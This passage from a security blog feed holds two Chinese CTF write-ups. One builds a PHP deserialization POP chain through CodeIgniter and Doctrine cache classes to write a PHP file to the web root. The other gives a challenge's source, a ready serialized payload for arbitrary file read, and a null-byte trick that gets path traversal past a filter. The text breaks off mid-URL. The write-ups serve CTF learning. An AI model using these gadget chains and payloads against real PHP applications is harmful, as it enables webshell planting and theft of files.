class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;_adapter&#125;-&gt;save(<span class="keyword">$this</span>-&gt;key_prefix.$id, $data, $ttl, $raw);</div><div class="line">    &#125;    </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>$this-&gt;_adapter</code>可控，且父类<code>CI_Driver_Library</code>存在<code>__get</code>方法，发现可以通过传入的<code>$this-&gt;_adapter</code>加载并实例化指定的类</p><p>system/libraries/Driver.php-&gt;CI_Driver_Library-&gt;__get-&gt;load_driver</p><p><img src="http://pic.c1imber.top/blog/20220929/kvqBzdfR4Mzv.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Driver_Library</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($child)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">// Try to load the driver</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;load_driver($child);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load_driver</span><span class="params">($child)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">// Get CodeIgniter instance and subclass prefix</span></div><div class="line">        $prefix = config_item(<span class="string">'subclass_prefix'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;lib_name))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Get library name without any prefix</span></div><div class="line">            <span class="keyword">$this</span>-&gt;lib_name = str_replace(<span class="keyword">array</span>(<span class="string">'CI_'</span>, $prefix), <span class="string">''</span>, get_class(<span class="keyword">$this</span>));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// The child will be prefixed with the parent lib</span></div><div class="line">        $child_name = <span class="keyword">$this</span>-&gt;lib_name.<span class="string">'_'</span>.$child;</div><div class="line"></div><div class="line">        <span class="comment">// See if requested child is a valid driver</span></div><div class="line">        <span class="keyword">if</span> ( ! in_array($child, <span class="keyword">$this</span>-&gt;valid_drivers))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// The requested driver isn't valid!</span></div><div class="line">            $msg = <span class="string">'Invalid driver requested: '</span>.$child_name;</div><div class="line">            log_message(<span class="string">'error'</span>, $msg);</div><div class="line">            show_error($msg);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Get package paths and filename case variations to search</span></div><div class="line">        $CI = get_instance();</div><div class="line">        $paths = $CI-&gt;load-&gt;get_package_paths(<span class="keyword">TRUE</span>);</div><div class="line"></div><div class="line">        <span class="comment">// Is there an extension?</span></div><div class="line">        $class_name = $prefix.$child_name;</div><div class="line">        $found = class_exists($class_name, <span class="keyword">FALSE</span>);</div><div class="line">        <span class="keyword">if</span> ( ! $found)</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Check for subclass file</span></div><div class="line">            <span class="keyword">foreach</span> ($paths <span class="keyword">as</span> $path)</div><div class="line">            &#123;</div><div class="line">                <span class="comment">// Does the file exist?</span></div><div class="line">                $file = $path.<span class="string">'libraries/'</span>.<span class="keyword">$this</span>-&gt;lib_name.<span class="string">'/drivers/'</span>.$prefix.$child_name.<span class="string">'.php'</span>;</div><div class="line">                <span class="keyword">if</span> (file_exists($file))</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">// Yes - require base class from BASEPATH</span></div><div class="line">                    $basepath = BASEPATH.<span class="string">'libraries/'</span>.<span class="keyword">$this</span>-&gt;lib_name.<span class="string">'/drivers/'</span>.$child_name.<span class="string">'.php'</span>;</div><div class="line">                    <span class="keyword">if</span> ( ! file_exists($basepath))</div><div class="line">                    &#123;</div><div class="line">                        $msg = <span class="string">'Unable to load the requested class: CI_'</span>.$child_name;</div><div class="line">                        log_message(<span class="string">'error'</span>, $msg);</div><div class="line">                        show_error($msg);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    <span class="comment">// Include both sources and mark found</span></div><div class="line">                    <span class="keyword">include_once</span>($basepath);</div><div class="line">                    <span class="keyword">include_once</span>($file);</div><div class="line">                    $found = <span class="keyword">TRUE</span>;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Do we need to search for the class?</span></div><div class="line">        <span class="keyword">if</span> ( ! $found)</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Use standard class name</span></div><div class="line">            $class_name = <span class="string">'CI_'</span>.$child_name;</div><div class="line">            <span class="keyword">if</span> ( ! class_exists($class_name, <span class="keyword">FALSE</span>))</div><div class="line">            &#123;</div><div class="line">                <span class="comment">// Check package paths</span></div><div class="line">                <span class="keyword">foreach</span> ($paths <span class="keyword">as</span> $path)</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">// Does the file exist?</span></div><div class="line">                    $file = $path.<span class="string">'libraries/'</span>.<span class="keyword">$this</span>-&gt;lib_name.<span class="string">'/drivers/'</span>.$child_name.<span class="string">'.php'</span>;</div><div class="line">                    <span class="keyword">if</span> (file_exists($file))</div><div class="line">                    &#123;</div><div class="line">                        <span class="comment">// Include source</span></div><div class="line">                        <span class="keyword">include_once</span>($file);</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Did we finally find the class?</span></div><div class="line">        <span class="keyword">if</span> ( ! class_exists($class_name, <span class="keyword">FALSE</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (class_exists($child_name, <span class="keyword">FALSE</span>))</div><div class="line">            &#123;</div><div class="line">                $class_name = $child_name;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                $msg = <span class="string">'Unable to load the requested driver: '</span>.$class_name;</div><div class="line">                log_message(<span class="string">'error'</span>, $msg);</div><div class="line">                show_error($msg);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Instantiate, decorate and add child</span></div><div class="line">        $obj = <span class="keyword">new</span> $class_name();</div><div class="line">        $obj-&gt;decorate(<span class="keyword">$this</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;$child = $obj;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$child;</div><div class="line">    &#125;    </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>所以这里可以将<code>$this-&gt;_adapter</code>设为file，加载system/libraries/Cache/drivers/Cache_file.php，调用<code>CI_Cache_file</code>类的<code>save</code>方法，写入webshell</p><p><img src="http://pic.c1imber.top/blog/20220929/8GRKCTRkqqj9.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Cache_file</span> <span class="keyword">extends</span> <span class="title">CI_Driver</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">protected</span> $_cache_path;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">         ....</div><div class="line">         <span class="keyword">$this</span>-&gt;_cache_path = ($path === <span class="string">''</span>) ? APPPATH.<span class="string">'cache/'</span> : $path;</div><div class="line">         ....</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($id, $data, $ttl = <span class="number">60</span>, $raw = FALSE)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">            $contents = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'time'</span>        =&gt; time(),</div><div class="line">            <span class="string">'ttl'</span>        =&gt; $ttl,</div><div class="line">            <span class="string">'data'</span>        =&gt; $data</div><div class="line">        );</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (write_file(<span class="keyword">$this</span>-&gt;_cache_path.$id, serialize($contents)))</div><div class="line">        &#123;</div><div class="line">            chmod(<span class="keyword">$this</span>-&gt;_cache_path.$id, <span class="number">0640</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>回到：<br>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php-&gt;CacheAdapter-&gt;commit</p><p>如何通过<code>$this-&gt;deferredItems</code>控制写入的文件路径和内容？</p><p>文件路径写入位置为：<code>APPPATH.&#39;cache/&#39;</code>:<code>application/cache</code></p><p>可以设置写入路径为../../xxx.php，写入根目录</p><p>文件内容来自<code>$item-&gt;get()</code>，全局搜索<code>get</code>方法，找到：</p><p>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheItem.php-&gt;get</p><p><img src="http://pic.c1imber.top/blog/20220929/aiivuPSl8tWe.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>;</div><div class="line"></div><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> <span class="keyword">implements</span> <span class="title">CacheItemInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">private</span> $value;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>$this-&gt;value</code>可以设置成文件内容，通过<code>get</code>获取到</p><p>pop链构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span></div><div class="line">&#123;</div><div class="line">    <span class="title">class</span> <span class="title">CI_Cache</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">protected</span> $<span class="title">_adapter</span>;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;_adapter=<span class="string">"file"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">CacheItem</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">private</span> $<span class="title">value</span>;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;value=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheAdapter</span></span></div><div class="line"><span class="class">    </span>&#123;</div><div class="line">        <span class="keyword">private</span> $cache;</div><div class="line">        <span class="keyword">private</span> $deferredItems = [];</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;cache=<span class="keyword">new</span> \CI_Cache();</div><div class="line">            <span class="keyword">$this</span>-&gt;deferredItems=<span class="keyword">array</span>(<span class="string">"../../aaa.php"</span>=&gt;<span class="keyword">new</span> CacheItem());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $a = <span class="keyword">new</span> CacheAdapter();</div><div class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2022长城杯awdplus&quot;&gt;&lt;a href=&quot;#2022长城杯awdplus&quot; class=&quot;headerlink&quot; title=&quot;2022长城杯awdplus&quot;&gt;&lt;/a&gt;2022长城杯awdplus&lt;/h1&gt;&lt;h3 id=&quot;admin-page&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2022网鼎杯白虎组-web-php反序列化</title>
    <link href="https://c1aysec.github.io/2022/08/27/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84-web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://c1aysec.github.io/2022/08/27/2022网鼎杯白虎组-web-php反序列化/</id>
    <published>2022-08-27T10:33:30.579Z</published>
    <updated>2022-08-30T04:51:45.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022网鼎杯白虎组-web-php反序列化"><a href="#2022网鼎杯白虎组-web-php反序列化" class="headerlink" title="2022网鼎杯白虎组-web-php反序列化"></a>2022网鼎杯白虎组-web-php反序列化</h1><h3 id="题目源码如下："><a href="#题目源码如下：" class="headerlink" title="题目源码如下："></a>题目源码如下：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $DoNotGet;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;DoNotGet-&gt;$name = <span class="string">"two"</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;DoNotGet-&gt;$name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Giveme;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">private</span> $filename = <span class="string">"one"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;readfile(<span class="string">"images/def.jpg"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">($f)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">isset</span>($f) ? $f : <span class="string">'image'</span>.<span class="keyword">$this</span>-&gt;file;</div><div class="line">        <span class="keyword">echo</span> file_get_contents(safe(<span class="keyword">$this</span>-&gt;file));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filename-&gt;Giveme;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $Giveme;</div><div class="line">    <span class="keyword">public</span> $action;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($name, $value)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;Giveme = (<span class="keyword">$this</span>-&gt;action)();</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Giveme;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $count;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;count = <span class="string">"one"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"try "</span>.<span class="keyword">$this</span>-&gt;count.<span class="string">" again"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($path)</span></span>&#123;</div><div class="line">    $path = preg_replace(<span class="string">"/.*\/\/.*/"</span>, <span class="string">""</span>, $path);</div><div class="line">    $path = preg_replace(<span class="string">"/\..\..*/"</span>, <span class="string">"!"</span>, $path);</div><div class="line">    $path = htmlentities($path);</div><div class="line">    <span class="keyword">return</span> strip_tags($path);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'game'</span>]))&#123;</div><div class="line">    unserialize($_GET[<span class="string">'game'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="pop链构造思路："><a href="#pop链构造思路：" class="headerlink" title="pop链构造思路："></a>pop链构造思路：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">One类的__destruct，可控属性拼接字符串操作</div><div class="line">-&gt;abaaba的__toString方法，Giveme属性不存在</div><div class="line">-&gt;abaaba的__get方法，<span class="keyword">$this</span>-&gt;DoNotGet-&gt;$name = <span class="string">"two"</span>;，属性赋值</div><div class="line">-&gt;suhasuha的__set方法,函数调用且可控</div><div class="line">-&gt;Onemore的readfile方法，任意文件读取</div></pre></td></tr></table></figure><h3 id="构造pop链："><a href="#构造pop链：" class="headerlink" title="构造pop链："></a>构造pop链：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onemore</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"><span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;file=<span class="string">"/../index.php"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">suhasuha</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"><span class="keyword">private</span> $Giveme;</div><div class="line">    <span class="keyword">public</span> $action;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;action=<span class="keyword">array</span>(<span class="keyword">new</span> Onemore(),<span class="string">"readfile"</span>);</div><div class="line">    <span class="keyword">$this</span>-&gt;Giveme=<span class="string">"a"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">abaaba</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"><span class="keyword">protected</span> $DoNotGet;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">$this</span>-&gt;DoNotGet=<span class="keyword">new</span> suhasuha();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"><span class="keyword">public</span> $count;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">$this</span>-&gt;count=<span class="keyword">new</span> abaaba();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> One());</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">3</span>:<span class="string">"One"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"count"</span>;O:<span class="number">6</span>:<span class="string">"abaaba"</span>:<span class="number">1</span>:&#123;S:<span class="number">11</span>:<span class="string">"\00*\00DoNotGet"</span>;O:<span class="number">8</span>:<span class="string">"suhasuha"</span>:<span class="number">2</span>:&#123;S:<span class="number">16</span>:<span class="string">"\00suhasuha\00Giveme"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">6</span>:<span class="string">"action"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">"Onemore"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">13</span>:<span class="string">"/../index.php"</span>;&#125;i:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">"readfile"</span>;&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure><p>成功读取到了源码</p><h3 id="目录穿越过滤绕过"><a href="#目录穿越过滤绕过" class="headerlink" title="目录穿越过滤绕过"></a>目录穿越过滤绕过</h3><p><strong>文件读取正则绕过思路：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$path = preg_replace(<span class="string">"/.*\/\/.*/"</span>, <span class="string">""</span>, $path);</div><div class="line">$path = preg_replace(<span class="string">"/\..\..*/"</span>, <span class="string">"!"</span>, $path);</div></pre></td></tr></table></figure><p>可知过滤规则：</p><p><code>.任意字符.</code>-&gt;全部替换成<code>!</code><br><code>任意字符//任意字符</code>-&gt;全部替换成空</p><p>由于过滤规则，导致穿越目录出现麻烦，<code>../../xxx</code>会因为<code>./.</code>全部被替换成<code>!</code>，并且<code>..//..//xxx</code>会因为<code>任意字符//任意字符</code>被全部清空</p><p><strong>问题转换：</strong></p><p>除了<code>/</code>，还有哪些字符可以出现在<code>.</code>和<code>/</code>之间并且可以成功目录穿越的</p><p>windows下可以通过<code>..\/..\/xxx</code>、<code>../\../\xxx</code>、<code>..\\..\\xxx</code>，但是这里是linux</p><p>通过本地fuzz，发现%00空字符可以出现在<code>.</code>和<code>/</code>之间</p><p><img src="http://pic.c1imber.top/blog/20220827/mXxT1yW14spA.png?imageslim" alt="mark"></p><p>重新构造，成功穿越目录读取flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span 